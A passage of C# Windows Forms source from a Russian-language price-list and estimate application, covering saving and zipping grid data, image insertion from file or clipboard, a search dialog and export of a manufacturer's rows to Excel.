                                if (textBox_P_S.Text != null && textBox_P_S.Text != "")
                                { output.Write(textBox_P_S.Text); }
                                else { output.Write(""); }
                                // закрываем поток
                                output.Close();
                            }
                            catch { erore_создания = true; }
                            //2)сохраняем основные данные
                            using (BinaryWriter bw = new BinaryWriter(File.Open(name_file_put, FileMode.Create)))
                            {
                                bw.Write(dataGridView_расчёт_2.Columns.Count);
                                bw.Write(dataGridView_расчёт_2.Rows.Count);
                                foreach (DataGridViewRow dgvR in dataGridView_расчёт_2.Rows)
                                {
                                    for (int j = 0; j < dataGridView_расчёт_2.Columns.Count; ++j)
                                    {
                                        object val = dgvR.Cells[j].Value;
                                        if (val == null)
                                        {
                                            bw.Write(false);
                                            bw.Write(false);
                                        }
                                        else
                                        {
                                            bw.Write(true);
                                            bw.Write(val.ToString()); //bw.Write(val.ToString());
                                            if (val.ToString() != "System.Drawing.Bitmap") //если текст
                                            {
                                                Bitmap img = dataGridView_расчёт_2.Rows[dgvR.Index].Cells[4].Value as Bitmap;
                                                if (img != null)
                                                {
                                                    if (dataGridView_расчёт_2.NewRowIndex != dgvR.Index)
                                                    {
                                                        PictureBox asa = new PictureBox();
                                                        asa.Image = img;
                                                        try
                                                        {
                                                            asa.Image.Save(Directory1 + "\\" + dgvR.Index.ToString() + ".jpg", System.Drawing.Imaging.ImageFormat.Jpeg);
                                                        }
                                                        catch
                                                        {

                                                        }
                                                    }
                                                    else
                                                    {
                                                        if (dataGridView_расчёт_2.Rows[dataGridView_расчёт_2.NewRowIndex].Cells[0].Value == null
                                                          && dataGridView_расчёт_2.Rows[dataGridView_расчёт_2.NewRowIndex].Cells[1].Value == null
                                                          && dataGridView_расчёт_2.Rows[dataGridView_расчёт_2.NewRowIndex].Cells[2].Value == null
                                                          && dataGridView_расчёт_2.Rows[dataGridView_расчёт_2.NewRowIndex].Cells[3].Value == null
                                                          && dataGridView_расчёт_2.Rows[dataGridView_расчёт_2.NewRowIndex].Cells[5].Value == null
                                                          && dataGridView_расчёт_2.Rows[dataGridView_расчёт_2.NewRowIndex].Cells[6].Value != null
                                                          && dataGridView_расчёт_2.Rows[dataGridView_расчёт_2.NewRowIndex].Cells[7].Value != null
                                                          )
                                                        {
                                                        }
                                                        else
                                                        {
                                                            PictureBox asa = new PictureBox();
                                                            asa.Image = img;
                                                            asa.Image.Save(Directory1 + "\\" + dgvR.Index.ToString() + ".jpg", System.Drawing.Imaging.ImageFormat.Jpeg);
                                                        }
                                                    }
                                                }
                                            }
                                        }
                                    }
                                }
                            }
                            //2)сохраняем файл зависимостей.
                            //////////////////////////
                            using (BinaryWriter bw = new BinaryWriter(File.Open(name_file_zav, FileMode.Create)))
                            {
                                bw.Write(dataGridView_зависимость.Columns.Count);
                                bw.Write(dataGridView_зависимость.Rows.Count);
                                foreach (DataGridViewRow dgvR in dataGridView_зависимость.Rows)
                                {
                                    for (int j = 0; j < dataGridView_зависимость.Columns.Count; ++j)
                                    {
                                        object val = dgvR.Cells[j].Value;
                                        if (val == null)
                                        {
                                            bw.Write(false);
                                            bw.Write(false);
                                        }
                                        else
                                        {
                                            bw.Write(true);

                                            switch (val.ToString())
                                            {
                                                case ("+"):
                                                    bw.Write("+");
                                                    break;
                                                case ("-"):
                                                    bw.Write("-");
                                                    break;
                                                case ("/"):
                                                    bw.Write("/");
                                                    break;
                                                case ("х"):
                                                    bw.Write("x");
                                                    break;
                                                default:
                                                    bw.Write(val.ToString());
                                                    break;
                                            }
                                        }
                                    }
                                }
                            }
                            /////////////////
                            //3) архивация данных
                            using (ZipFile zip = new ZipFile(Encoding.GetEncoding(866)))
                            {
                                string zzz = Directory1;
                                char[] charArr = (name_file + ".DAH").ToCharArray();
                                string ddd = filename.TrimEnd(charArr);
                                string aaa = Directory1 + "\\" + name_file + ".DAH";
                                zip.AddDirectory(@Directory1, name_file);
                                zip.Save(@ddd + name_file + ".DAH");
                                try { Directory.Delete(@Directory1, true); } catch { }
                            }
                        }
                        catch
                        {
                            MessageBox.Show("Невозможно сохранить временные файлы в папку программы, нет доступа.", "Ошибка", MessageBoxButtons.OK, MessageBoxIcon.Error);
                            erore_создания = true;
                        }                       
                        this.Text = "Прайс Дахмиры        источник:" + istohtik_bazi;
                    }
                    создала_шаблон = true;
                }
                System.IO.FileInfo new_put = new System.IO.FileInfo(istohtik_bazi);
                string directory = new_put.DirectoryName;
                try { string[] second = Directory.GetFiles(directory + "\\шаблоны"); } catch { return; } // путь к папке // это понадобится для удаления. 
                label_consol_2.Text = "идет копирование к прайсу";
                string path = Environment.CurrentDirectory + "\\rez\\CNDataTemp\\" + имя_файла; ;
                string newPath = directory + "\\шаблоны\\" + имя_файла;
                FileInfo fileInf = new FileInfo(path);
                if (fileInf.Exists)
                {
                    fileInf.MoveTo(newPath);
                }
                label_consol_2.Text = "Создан новый шаблон в папке прайса. Имя: " + имя_файла;
                Save_history_user_work("Я создал шаблон:" + newPath, newPath);

                //почистим темп
                string[] second1 = Directory.GetFiles(Environment.CurrentDirectory + "\\rez\\CNDataTemp\\"); // путь к файлам // это понадобится для удаления. 
                if (second1.Length > 0)
                {
                    try { for (int x = 0; x < second1.Length; x++) File.Delete(second1[x]); } catch { }
                }
                string[] second2 = Directory.GetDirectories(Environment.CurrentDirectory + "\\rez\\CNDataTemp\\"); // путь к папке 
                if (second2.Length > 0)
                {
                    try { for (int x = 0; x < second2.Length; x++) Directory.Delete(second2[x]); } catch { }
                }
                button_создать_шаблон.Visible = false;
                otclehivat_polzovatelia = true;
            }

        }


        public string путь_и_имя_файла_шаблона = "";
        public string имя_файла_шаблона = "";

        private void button4_Click(object sender, EventArgs e)
        {
            Process.Start("Calc.exe");
        }




        //фотография button_расчет_фото_доб  button_расчет_фото_сохранить  button_расчет_фото_из_буфера button_расчет_фото_в_буфер
        private void button_расчет_фото_доб_Click(object sender, EventArgs e)
        {
            Boolean dsd = false;
            try { int a = dataGridView_расчёт_2.CurrentCell.RowIndex; } catch { dsd = true; }

            if (dsd == true)
            {
                label_consol_2.Text = "Ну ты выдал!";
                MessageBox.Show("Сюда нельзя вставлять!",
                         "Не буду! ", MessageBoxButtons.OK, MessageBoxIcon.Information);
            }
            else
            {
                label_consol_2.Text = "Попытка вставить файл с фоткай..";
                OpenFileDialog open_dialog = new OpenFileDialog(); //создание диалогового окна для выбора файла
                open_dialog.Filter = "Image Files(*.BMP;*.JPG;*.GIF;*.PNG)|*.BMP;*.JPG;*.GIF;*.PNG|All files (*.*)|*.*"; //формат загружаемого файла
                if (open_dialog.ShowDialog() == DialogResult.OK) //если в окне была нажата кнопка "ОК"
                {
                    try
                    {
                        Bitmap image1 = new Bitmap(open_dialog.FileName);
                        if (image1.Size.Height > 401 || image1.Size.Width > 401)
                        {
                            label_consol_2.Text = "В меня пытаются воткнуть здоровенню картинку!. А стоит ли?";
                            DialogResult result = MessageBox.Show(
                             "Картинка превышает размер 400х400 пиксилей!\nИмеет размеры: " + image1.Size.Height.ToString() + " высоты и " + image1.Size.Width.ToString() + " ширины. \n\nЕсли нажмёте Да- перенесу как есть.\nЕсли нажмешь Нет - сконвертирую и уменьшу.\nЕсли нажмешь Отмена- ничего не вставлю в эту ячейку.",
                             "ой, ё..стопэ..",
                             MessageBoxButtons.YesNoCancel,
                             MessageBoxIcon.Information);
                            if (result == DialogResult.Yes)
                            {

                                dataGridView_расчёт_2.Rows[dataGridView_расчёт_2.CurrentCell.RowIndex].Cells[4].Value = image1;
                                pictureBox_Raz.Image = image1;
                                label_consol_2.Text = "Загружена здоровенная картинка в ячейку! Ну ты понимаешь, что если 1 Мб фото. И 10000 фото в базе, то это 10Gb оперативки надо только на фото!";
                            }
                            else if
                        (result == DialogResult.No)
                            {
                                if (image1.Width > 401) { image1 = new Bitmap(image1, new Size(400, (400 * image1.Height) / image1.Width)); }

                                else { image1 = new Bitmap(image1, new Size((400 * image1.Width) / image1.Height, 400)); }

                                dataGridView_расчёт_2.Rows[dataGridView_расчёт_2.CurrentCell.RowIndex].Cells[4].Value = image1;
                                pictureBox_Raz.Image = image1;

                                label_consol_2.Text = "Загружена картинка в строку! Я её уменьшила. Все ок!";
                            }
                            else if
                            (result == DialogResult.Cancel) { label_consol_2.Text = "Правильно, нечего захламлять расчётку ерундой."; }
                        }
                        else
                        {
                            dataGridView_расчёт_2.Rows[dataGridView_расчёт_2.CurrentCell.RowIndex].Cells[4].Value = image1;
                            pictureBox_Raz.Image = image1;
                            label_consol_2.Text = "Загружена картинка в строку!";
                        }
                    }
                    catch
                    {
                        MessageBox.Show("Невозможно открыть выбранный файл. С файлом, что то не так или он открыт где-то ещё!",
                        "Ошибка", MessageBoxButtons.OK, MessageBoxIcon.Error);
                        label_consol_2.Text = "Неполучилось вставить изображение! бывает. Попробуй другой файл.";
                    }
                }

            }

        }

        private void button_расчет_фото_сохранить_Click(object sender, EventArgs e)
        {

            if (dataGridView_расчёт_2.NewRowIndex == 0) { label_consol_2.Text = "Пустая строка? Пора пить кофе"; return; }
            label_consol_2.Text = "Пользователь решил сохранить фото";
            SaveFileDialog saveFileDialog1 = new SaveFileDialog(); //создание диалогового окна для выбора файла
            saveFileDialog1.FileName = dataGridView_расчёт_2.Rows[dataGridView_расчёт_2.CurrentCell.RowIndex].Cells[3].Value.ToString();
            saveFileDialog1.Filter = "изображение(.jpg)|*.jpg|с прозрачностью(.png)|*.png|древний формат(*.bmp)|*.bmp"; //формат загружаемого файла
            try
            {
                if (saveFileDialog1.ShowDialog() == DialogResult.Cancel)
                    return;
                // получаем выбранный файл
                string filename = saveFileDialog1.FileName;
                // сохраняем текст в файл

                System.Drawing.Image image1 = dataGridView_расчёт_2.Rows[dataGridView_расчёт_2.CurrentCell.RowIndex].Cells[4].Value as Bitmap;


                string format = saveFileDialog1.FileName;
                format = format.Substring(format.Length - 3);
                if (format == "jpg") image1.Save(saveFileDialog1.FileName, System.Drawing.Imaging.ImageFormat.Jpeg);
                if (format == "bmp") image1.Save(saveFileDialog1.FileName, System.Drawing.Imaging.ImageFormat.Bmp);
                if (format == "png") image1.Save(saveFileDialog1.FileName, System.Drawing.Imaging.ImageFormat.Png);

                label_consol_2.Text = "Файл сохранен по пути:" + saveFileDialog1.FileName;

                // MessageBox.Show("Файл сохранен");  
            }
            catch
            {
                MessageBox.Show("Невозможно сохранить файл",
                "Ошибка", MessageBoxButtons.OK, MessageBoxIcon.Error);
                label_consol_2.Text = "Не смертельна, может нет доступа к папке, не от админа сидим тут";
            }

        }


        private void button_расчет_фото_из_буфера_Click(object sender, EventArgs e)
        {


            Boolean dsd = false;
            try { int a = dataGridView_расчёт_2.CurrentCell.RowIndex; } catch { dsd = true; }

            if (dsd == true)
            {
                label_consol_2.Text = "Ну ты выдал!";
                MessageBox.Show("Сюда нельзя вставлять!",
                         "Не буду! ", MessageBoxButtons.OK, MessageBoxIcon.Information);
            }
            else
            {

                try
                {

                    System.Drawing.Image image1 = Clipboard.GetImage(); ;
                    if (image1.Size.Height > 401 || image1.Size.Width > 401)
                    {

                        label_consol_2.Text = "В меня пытаются воткнуть здоровенню картинку!. Эй!.";
                        DialogResult result = MessageBox.Show(
                         "Рисунок в буфере превышает размер 400х400 пиксилей!\nИмеет размеры: " + image1.Size.Height.ToString() + " высоты и " + image1.Size.Width.ToString() + " ширины. \n\nЕсли нажмёте Да- перенесу как есть.\nЕсли нажмешь Нет - сконвертирую и уменьшу.\nЕсли нажмешь Отмена- ничего не вставлю в эту ячейку.",
                         "У нас тут проблемка.",
                         MessageBoxButtons.YesNoCancel,
                         MessageBoxIcon.Information);
                        if (result == DialogResult.Yes)
                        {

                            dataGridView_расчёт_2.Rows[dataGridView_расчёт_2.CurrentCell.RowIndex].Cells[4].Value = image1;
                            pictureBox_Raz.Image = image1;
                            label_consol_2.Text = "Загружена картинка! Ну ты понимаешь, что если 1 Мб фото. И 10000 фото в базе, то это 10Gb оперативки надо только на фото!";
                        }
                        else if
                    (result == DialogResult.No)
                        {
                            if (image1.Width > 401) { image1 = new Bitmap(image1, new Size(400, (400 * image1.Height) / image1.Width)); }

                            else { image1 = new Bitmap(image1, new Size((400 * image1.Width) / image1.Height, 400)); }

                            dataGridView_расчёт_2.Rows[dataGridView_расчёт_2.CurrentCell.RowIndex].Cells[4].Value = image1;
                            pictureBox_Raz.Image = image1;

                            label_consol_2.Text = "Загружена картинка из буфера! Я её уменьшила. Все ок!";
                        }
                        else if
                        (result == DialogResult.Cancel) { label_consol_2.Text = "Юзер передумал! Может кофейу?!?. Плесни мне на мышку."; }
                    }
                    else
                    {
                        dataGridView_расчёт_2.Rows[dataGridView_расчёт_2.CurrentCell.RowIndex].Cells[4].Value = image1;
                        pictureBox_Raz.Image = image1;
                        label_consol_2.Text = "Загружена картинка из буфера!";
                    }
                }
                catch
                {
                    label_consol_2.Text = "В буфере какое то говницо!";
                }
            }
        }

        private void button_расчет_фото_в_буфер_Click(object sender, EventArgs e)
        {
            try
            {
                System.Drawing.Image image1 = dataGridView_расчёт_2.Rows[dataGridView_расчёт_2.CurrentCell.RowIndex].Cells[4].Value as Bitmap;
                Clipboard.SetImage(image1); label_consol_2.Text = "Рисунок поместила в буфер..";
            }
            catch { label_consol_2.Text = "Не получилось, нечего заганять."; } // загнать в буфер обмена 

        }

        private void справкаПоПрайсуToolStripMenuItem1_Click(object sender, EventArgs e)
        {
            Form ee = new o_programme_otziv();
            ee.Show();


        }

        private void button_расчет_фото_удалить_Click(object sender, EventArgs e)
        {
            dataGridView_расчёт_2.Rows[dataGridView_расчёт_2.CurrentCell.RowIndex].Cells[4].Value = null;
            pictureBox_Raz.Image = pictureBox_Raz1.Image;
        }

        private void фотографияPictureBox_BackgroundImageChanged(object sender, EventArgs e)
        {

        }

        private void фотографияPictureBox_LoadCompleted(object sender, AsyncCompletedEventArgs e)
        {

        }

        private void фотографияPictureBox_Paint(object sender, PaintEventArgs e)
        {


        }

        private void фотографияPictureBox_LoadProgressChanged(object sender, ProgressChangedEventArgs e)
        {

        }

        private void tableDataGridView_CurrentCellChanged(object sender, EventArgs e)
        {
            System.Drawing.Image ff = null;
            try { ff = фотографияPictureBox.Image; } catch { }
            if (ff == null)
            {
                groupBox1.Enabled = false;
                pictureBox_no_image.Visible = true;
            }
            else
            {
                groupBox1.Enabled = true;
                pictureBox_no_image.Visible = false;
            }
        }

        private void button_del_new_image_Click(object sender, EventArgs e)
        {
            pictureBox_no_image_добавить_в_прайс.Visible = true;
            if (pictureBox_new_image.Image != null)
            {
                pictureBox_new_image.Image.Dispose();
                pictureBox_new_image.Image = null;
            }






        }

        //комбинация клавишь

        private void Form1_KeyDown(object sender, KeyEventArgs e)
        {


            if (Control.ModifierKeys == Keys.Control && e.KeyCode == Keys.Tab)
            {
                button_Baza_RACHET.PerformClick();
            }


            if (Control.ModifierKeys == Keys.Control && e.KeyCode == Keys.N)
            {
                новыйРасчетToolStripMenuItem.PerformClick();
            }

            if (Control.ModifierKeys == Keys.Control && e.KeyCode == Keys.O)
            {
                загрузитьРасчетToolStripMenuItem.PerformClick();
            }

            if (Control.ModifierKeys == Keys.Control && e.KeyCode == Keys.S)
            {
                сохранитьКакToolStripMenuItem.PerformClick();
            }





            if ((e.KeyCode == Keys.O) && e.Control && e.Shift == true)
            {
                загрузитьПрайсToolStripMenuItem.PerformClick();
            }
            if ((e.KeyCode == Keys.S) && e.Control && e.Shift == true)
            {



                if (сохранитьПрайсToolStripMenuItem.Enabled == true) { сохранитьПрайсToolStripMenuItem.PerformClick(); } else { MessageBox.Show("Так нельзя!", "Нет подключения!", MessageBoxButtons.OK, MessageBoxIcon.Stop); }
            }


            if (Control.ModifierKeys == Keys.Control && e.KeyCode == Keys.H)
            {
                if (вРазработкеСоздатьШаблонToolStripMenuItem.Enabled == true) вРазработкеСоздатьШаблонToolStripMenuItem.PerformClick();
            }


            if (Control.ModifierKeys == Keys.Control && e.KeyCode == Keys.F)//поиск
            {

                searh.StartPosition = FormStartPosition.CenterScreen;
                searh.BackColor = Color.LightGray;
                searh.Size = new Size(230, 150);
                searh.Text = "Поиск";
                searh.Icon = System.Drawing.Icon.ExtractAssociatedIcon("ico.ico");
                searh.MaximizeBox = false;
                searh.MinimizeBox = false;
                searh.MinimumSize = new Size(230, 150);
                searh.MaximumSize = new Size(230, 150);
                searh.FormBorderStyle = FormBorderStyle.SizableToolWindow;
                searh.KeyPreview = true;
                System.Windows.Forms.Label laba = new System.Windows.Forms.Label();
                laba.Location = new System.Drawing.Point(5, 5);
                laba.Size = new Size(150, 13);
                if (Baza == false) laba.Text = "Поиск внутри базы:"; else laba.Text = "Поиск внутри расчётки:";
                check_dalee.Location = new System.Drawing.Point(5, 22);
                check_dalee.Size = new Size(200, 15);
                check_dalee.Text = "Искать ниже с выделеной ячейки";
                searh_text.Location = new System.Drawing.Point(5, 41);
                searh_text.Size = new Size(200, 20);
                searh_button.Location = new System.Drawing.Point(5, 68);
                searh_button.Text = "поиск";
                searh_button.Size = new Size(150, 25);
                searh.Controls.Add(laba);
                searh.Controls.Add(check_dalee);
                searh.Controls.Add(searh_text);
                searh.Controls.Add(searh_button);
                searh.ActiveControl = searh_text;
                searh.ShowDialog();
                string dd = searh.TopMost.ToString();
                if (Baza == false) { baza_searh_position[0] = 0; baza_searh_position[1] = 0; } else { praise_searh_position[0] = 0; praise_searh_position[1] = 0; }
            }



          



        }

        #region поиск ctrl f
        Form searh = new Form();
        System.Windows.Forms.TextBox searh_text = new System.Windows.Forms.TextBox();
        System.Windows.Forms.CheckBox check_dalee = new System.Windows.Forms.CheckBox();
        System.Windows.Forms.Button searh_button = new System.Windows.Forms.Button();

        int[] baza_searh_position = { 0, 0 };
        int[] praise_searh_position = { 0, 0 };

        private void button_searh(object sender, EventArgs e)
        {
            if (searh_text.Text != "")
            {
                if (Baza == false)
                {//поиск в базе
                    if (searh_button.Text == "поиск далее")
                    {
                        int x = baza_searh_position[0];
                        int y = 0;
                        bool yy = false;
                        if (baza_searh_position[1] > 5) { x++; y = 0; }
                        if (x < tableDataGridView.Rows.Count - 1)
                        {
                            for (int i = x; i < tableDataGridView.Rows.Count - 1; i++)
                            {
                                for (int h = 1; h <= 5; h++)
                                {
                                    if (yy == false)
                                    {
                                        yy = true;
                                        h = baza_searh_position[1];
                                        if (h == 4) { h = 5; }
                                    }
                                    if (h != 4)
                                    {
                                        try
                                        {
                                            string sd = tableDataGridView.Rows[i].Cells[h].Value.ToString();
                                            if (sd.ToLower().Contains(searh_text.Text.ToLower()))
                                            {
                                                tableDataGridView.CurrentCell = tableDataGridView.Rows[i].Cells[h];
                                                baza_searh_position[0] = i;
                                                baza_searh_position[1] = h + 1;
                                                searh_button.Text = "поиск далее";
                                                i = tableDataGridView.Rows.Count - 1;
                                            }
                                        }
                                        catch { }
                                    }
                                }
                                if (tableDataGridView.Rows.Count - 2 == i)
                                {
                                    baza_searh_position[0] = 0; baza_searh_position[1] = 0;
                                    yy = false;
                                    searh_button.Text = "поиск";
                                    MessageBox.Show("Поиск окончен. Нету больше", "Сообщение");
                                    goto prwe;
                                }
                            }
                        }
                    }
                    if (searh_button.Text == "поиск")
                    {


                        int n = 0;
                        int v = 1;
                        bool r = false;
                        if (check_dalee.Checked == true)
                        {
                            n = tableDataGridView.CurrentCell.RowIndex;
                            v = tableDataGridView.CurrentCell.ColumnIndex;
                            r = true;

                        }



                        for (int i = n; i < tableDataGridView.Rows.Count - 1; i++)
                        {
                            for (int h = 1; h <= 5; h++)
                            {
                                if (r == true)
                                {
                                    r = false;
                                    h = v + 1;
                                    if (v == 4) { v = 5; }
                                    if (v >= 6) { v = 1; i++; }


                                }

                                if (h != 4)
                                {
                                    try
                                    {
                                        string sd = tableDataGridView.Rows[i].Cells[h].Value.ToString();
                                        if (sd.ToLower().Contains(searh_text.Text.ToLower()))
                                        {
                                            tableDataGridView.CurrentCell = tableDataGridView.Rows[i].Cells[h];
                                            baza_searh_position[0] = i;
                                            baza_searh_position[1] = h + 1;
                                            searh_button.Text = "поиск далее";
                                            i = tableDataGridView.Rows.Count - 1;
                                        }
                                    }
                                    catch { }
                                }
                            }

                            if (tableDataGridView.Rows.Count - 2 == i)
                            {
                                MessageBox.Show("Поиск окончен. Нету", "Сообщение");

                            }
                        }
                    }

                    prwe:
                    label10 = label10;
                }
                else
                {//поиск в прайсе 
                    if (searh_button.Text == "поиск далее")
                    {
                        int x = praise_searh_position[0];
                        int y = 0;
                        bool yy = false;
                        if (praise_searh_position[1] > 7) { x++; y = 0; }
                        if (x < dataGridView_расчёт_2.Rows.Count - 1)
                        {
                            for (int i = x; i < dataGridView_расчёт_2.Rows.Count - 1; i++)
                            {
                                for (int h = 1; h <= 7; h++)
                                {
                                    if (yy == false)
                                    {
                                        yy = true;
                                        h = praise_searh_position[1];
                                        if (h == 4) { h = 5; }
                                    }
                                    if (h != 4)
                                    {
                                        try
                                        {
                                            string sd = dataGridView_расчёт_2.Rows[i].Cells[h].Value.ToString();
                                            if (sd.ToLower().Contains(searh_text.Text.ToLower()))
                                            {
                                                dataGridView_расчёт_2.CurrentCell = dataGridView_расчёт_2.Rows[i].Cells[h];
                                                praise_searh_position[0] = i;
                                                praise_searh_position[1] = h + 1;
                                                searh_button.Text = "поиск далее";
                                                i = dataGridView_расчёт_2.Rows.Count - 1;
                                            }
                                        }
                                        catch { }
                                    }
                                }
                                if (dataGridView_расчёт_2.Rows.Count - 2 == i)
                                {
                                    praise_searh_position[0] = 0; praise_searh_position[1] = 0;
                                    yy = false;
                                    searh_button.Text = "поиск";
                                    MessageBox.Show("Поиск окончен. Нету больше", "Сообщение");
                                    goto prwe1;
                                }
                            }
                        }
                    }
                    if (searh_button.Text == "поиск")
                    {
                        int n = 0;
                        int v = 0;
                        bool r = false;
                        if (check_dalee.Checked == true)
                        {
                            n = dataGridView_расчёт_2.CurrentCell.RowIndex;
                            v = dataGridView_расчёт_2.CurrentCell.ColumnIndex;
                            r = true;
                        }
                        for (int i = n; i < dataGridView_расчёт_2.Rows.Count - 1; i++)
                        {
                            for (int h = 1; h <= 7; h++)
                            {
                                if (r == true)
                                {
                                    r = false;
                                    h = v + 1;
                                    if (v == 4) { v = 5; }
                                    if (v >= 8) { v = 0; i++; }
                                }
                                if (h != 4)
                                {
                                    try
                                    {
                                        string sd = dataGridView_расчёт_2.Rows[i].Cells[h].Value.ToString();
                                        if (sd.ToLower().Contains(searh_text.Text.ToLower()))
                                        {
                                            dataGridView_расчёт_2.CurrentCell = dataGridView_расчёт_2.Rows[i].Cells[h];
                                            praise_searh_position[0] = i;
                                            praise_searh_position[1] = h + 1;
                                            searh_button.Text = "поиск далее";
                                            i = dataGridView_расчёт_2.Rows.Count - 1;
                                        }
                                    }
                                    catch { }
                                }
                            }
                            if (dataGridView_расчёт_2.Rows.Count - 2 == i)
                            {
                                MessageBox.Show("Поиск окончен. Нету", "Сообщение");
                            }
                        }
                    }
                    prwe1:
                    label10 = label10;
                }
            }
        }
        private void searh_text_Enter(object sender, KeyEventArgs e)
        {
            if (e.KeyCode == Keys.Enter)
            {
                if (searh_text.Text != "") searh_button.PerformClick();
            }
        }
        private void key_okno(object sender, KeyEventArgs e)
        {
            if (e.KeyCode == Keys.Escape)
            {
                searh.Close();
            }
        }

        #endregion поиск ctrl f

        private void textBox_new_производитель_TextChanged(object sender, EventArgs e)
        {

        }

        private void numericUpDown1_KeyUp(object sender, KeyEventArgs e)
        {

            InputLanguage myCurrentLanguage = InputLanguage.CurrentInputLanguage;
            if (myCurrentLanguage.LayoutName == "США" && e.KeyCode == Keys.Decimal)
            {
                SendKeys.SendWait(",");
            }


        }

        private void bindingNavigatorAddNewItem_Click(object sender, EventArgs e)
        {

        }

        private void toolStripButtonDel2_Click(object sender, EventArgs e)
        {
            if (open_window_otchetik == true)
            {
                label_consol.Text = "Удаляйте в окне поиска, пожалуйста!";
                return;
            }
            if (MessageBox.Show("Точно удалить", "Уточнение", MessageBoxButtons.YesNo, MessageBoxIcon.Stop) == DialogResult.Yes)
            {
                int ad = tableDataGridView.CurrentCell.RowIndex;
                tableDataGridView.Rows.RemoveAt(ad);
                label_consol.Text = "Выбранная строка была удалена из прайса..";
            }
            else
            {
                label_consol.Text = "Пользователь решил оставить строку..";
            }
        }

        private void dataGridView_расчёт_2_KeyDown(object sender, KeyEventArgs e)
        {
            if (e.KeyData == Keys.Delete )
            {

               if(DialogResult.OK== MessageBox.Show("Точно удалить?", "Уточнение", MessageBoxButtons.OKCancel, MessageBoxIcon.Warning))
               {
                    button_del_razhet.PerformClick();
               }
            }
        }
        int previous_dataGridView_расчёт_2_CurrentCell_RowIndex = 0;
        bool previous_dataGridView_расчёт = false;
        private void dataGridView_расчёт_2_CellLeave(object sender, DataGridViewCellEventArgs e)
        {
            ///// действие 1 

            if (5 == dataGridView_расчёт_2.CurrentCell.ColumnIndex)
            {
                previous_dataGridView_расчёт = true;
                previous_dataGridView_расчёт_2_CurrentCell_RowIndex = dataGridView_расчёт_2.CurrentCell.RowIndex;

            }




        }


        int xaxa55 = 0;
        private void получитьИзПрайсаОпределенногоПроизводителяToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (tableDataGridView.CurrentRow == null)
            {
                if (xaxa55 == 0) { label_consol.Text = "Серьёзно? Нечего сохранять. Серьезно?"; xaxa55++; } else { xaxa55++; label_consol.Text = "Оцепись от этой кнопки!!!"; if (xaxa55 == 3) { label_consol.Text = "О%;ебись!!!"; } if (xaxa55 > 4) { xaxa55 = 0; } }
            }
            else
            {




                string result = Microsoft.VisualBasic.Interaction.InputBox("Введите Имя производителя, которого будем сохраять?\n\nЕсли у производителя есть ФОТОГРАФИИ,\nто сохранять рекомендую в пустую папку!", "Окно ввода имени.", tableDataGridView.Rows[tableDataGridView.CurrentCell.RowIndex].Cells[1].Value.ToString());
                if (result != "")//если пользователь, что то родил в строку.
                {

                    int quantity_CurrentRow = 0;
                    for (int i = 0; i < tableDataGridView.RowCount - 1; i++)
                    {
                        string name = null;
                        try { name = tableDataGridView.Rows[i].Cells[1].Value.ToString(); if (name == result) quantity_CurrentRow++; } catch { }
                    }

                    if (quantity_CurrentRow == 0) { MessageBox.Show("Такого нет производителя!", "Наверно криво вписал!", MessageBoxButtons.OK, MessageBoxIcon.Stop); }
                    else
                    {

                        label_consol.Text = "Юзер решил вывести  в Ексельку?";
                        SaveFileDialog saveFileDialog1 = new SaveFileDialog(); //создание диалогового окна для выбора файла
                        saveFileDialog1.FileName = result;
                        saveFileDialog1.Filter = "Таблица excel(.xlsx)|*.xlsx"; //формат загружаемого файла

                        try
                        {
                            //обходчик окон
                            Baza = false; button_Baza_RACHET.Text = "ПРАЙС > РАСЧЁТ"; groupBox_baza.Visible = true; groupBox_razhet.Visible = false;
                            button_поиск.PerformClick();


                            if (saveFileDialog1.ShowDialog() == DialogResult.Cancel)
                                return;
                            dialog_mess("Start");
                            // получаем выбранный файл
                            string filename = saveFileDialog1.FileName;

                            label_consol.Text = "Загружаю Excel на компьютере...";

                            Excel._Application m_app = null;
                            // Книга Excel.
                            dialog_mess("Запуск Ecsel");
                            Excel.Workbook m_workBook = null;
                            // Страница Excel.
                            Excel.Worksheet m_workSheet = null;
                            //Диапазон ячеек
                            Excel.Range rg = null;

                            try
                            {
                                label_consol.Text = "Создаю в Еxcel новый фаил...";
                                // Создание приложения Excel.
                                m_app = new Excel.Application();

                                // Приложение "невидимо".
                                m_app.Visible = false;
                                // Приложение управляется пользователем.
                                m_app.UserControl = true;

                                // Открытие файла Excel.
                                string put_k_programme = Environment.CurrentDirectory;
                                label_consol.Text = "Загружаю файл шаблона..";
                                dialog_mess("Создаю шаблон");
                                m_workBook = m_app.Workbooks.Open(put_k_programme + "\\rez\\шаблон2.xlsx", Type.Missing, Type.Missing,
                                     Type.Missing, Type.Missing, Type.Missing, Type.Missing, Type.Missing, Type.Missing, Type.Missing,
                                     Type.Missing, Type.Missing, Type.Missing, Type.Missing, Type.Missing);

                                // Связь со страницей Excel.
                                m_workSheet = m_app.ActiveSheet as Excel.Worksheet;

                                label_consol.Text = "Ну вздрогним! ";

                                //   tableDataGridView
                                //quantity_CurrentRow

                                int quantity_CurrentRow_new = 0;


                                System.IO.FileInfo obj21 = new System.IO.FileInfo(filename); // получаем имя

                                char[] MyChar1 = { '.', 'x', 'l', 's', 'x' };
                                string Directory11 = obj21.Name.TrimEnd(MyChar1); // путь к папке   

                                char[] charArr = (Directory11 + ".xlsx").ToCharArray();
                                //   string ddd = filename.TrimEnd(charArr);
                                string pyt_k_file = filename.TrimEnd(charArr);
                                //   put_k_arhiv = Directory1 + "//" + name_file + ".DAH";
                                int f = 0;
                                for (int i = 0; i < tableDataGridView.RowCount - 1; i++)
                                {
                                    dialog_mess("Взято: " + f.ToString() + " " +
                                        "Обработ.: " + ((((i + 1) * 100) / tableDataGridView.RowCount)).ToString() + " %");

                                    string name = null;
                                    try { name = tableDataGridView.Rows[i].Cells[1].Value.ToString(); } catch { }
                                    if (name != null && name == result)
                                    {
                                        f++;


                                        for (int j = 1; j < tableDataGridView.ColumnCount - 1; j++)
                                        {
                                            if (j != 4) { m_workSheet.Rows[quantity_CurrentRow_new + 1].Columns[j] = tableDataGridView.Rows[i].Cells[j].Value; }
                                            if (j == 4)
                                            {

                                                //цена
                                                m_workSheet.Rows[quantity_CurrentRow_new + 1].Columns[j] = tableDataGridView.Rows[i].Cells[j + 1].Value;
                                                //фото
                                                tableDataGridView.CurrentCell = tableDataGridView.Rows[i].Cells[1];

                                                //    фотографияPictureBox.Image.Save(saveFileDialog1.FileName, System.Drawing.Imaging.ImageFormat.Bmp);
                                                System.Drawing.Image image1 = фотографияPictureBox.Image;

                                                if (image1 != null)
                                                {
